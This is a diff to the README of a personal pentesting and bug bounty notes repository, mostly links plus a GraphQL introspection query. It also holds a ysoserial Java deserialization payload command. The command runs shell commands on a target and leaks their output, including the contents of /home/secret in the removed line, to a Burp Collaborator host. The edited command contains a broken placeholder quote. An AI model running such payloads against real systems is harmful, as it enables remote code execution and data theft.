@@ -4,9 +4,10 @@ EasyG started out as a script that I use to automate some information gathering 
 
 Here I gather all the resources about PenTesting and Bug Bounty Hunting that I find interesting: notes, payloads that I found useful and many links to blogs and articles that I want to read (because having a lot of bookmarks bothered me) and more.
 
-**To Read list**
+### To Read list
 - https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application
 - https://github.com/righettod/poc-graphql
+- https://lab.wallarm.com/graphql-batching-attack/
 - https://blog.yeswehack.com/yeswerhackers/abusing-s3-bucket-permissions/
 - https://portswigger.net/web-security/ssrf
 - https://portswigger.net/web-security/jwt
@@ -16,30 +17,30 @@ Here I gather all the resources about PenTesting and Bug Bounty Hunting that I f
 - https://www.bugcrowd.com/hackers/bugcrowd-university/
 - https://www.microsoft.com/en-us/msrc/bounty-example-report-submission?rtc=1
 
-**Blog / Writeups / News**
+### Blog / Writeups / News
 - https://pentester.land/list-of-bug-bounty-writeups.html
 - https://hackerone.com/hacktivity
 - https://portswigger.net/research
 - https://www.skeletonscribe.net
 - https://cvetrends.com/
 
-**Burp suite**
+### Burp suite
 
 To add a domain + subdomains in advanced scopes: `.*\.test\.com$`
 
-**Ysoserial**
+### Ysoserial
 
-Because of `Runtime.exec()`, ysoserial doesn't work well with multiple commands. After some research, I found a way to run multiple sys commands anyway, by using `sh -c $@|sh . echo ` before the multiple commands that we need to run. Here's an example:
+Because of `Runtime.exec()`, ysoserial doesn't work well with multiple commands. After some research, I found a way to run multiple sys commands anyway, by using `sh -c $@|sh . echo ` before the multiple commands that we need to run. Here I needed to run the command `host` and `whoami`:
 
 ```
-java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 'sh -c $@|sh . echo host $(cat /home/secret).dctoqqar8fjkhoahnzjvxw9980ev2k.burpcollaborator.net' | gzip | base64
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 'sh -c $@|sh . echo host $(whoami).<MY-'RATOR-ID>.burpcollaborator.net' | gzip | base64
 ```
 
-**GraphQL**
+### GraphQL
 
 To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangoncharov.github.io/graphql-voyager/) or [InQL](https://github.com/doyensec/inql) for Burp Suite.
 
-GraphQL Introspection query
+**GraphQL Introspection query**
 
 ```
 {"query": "{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
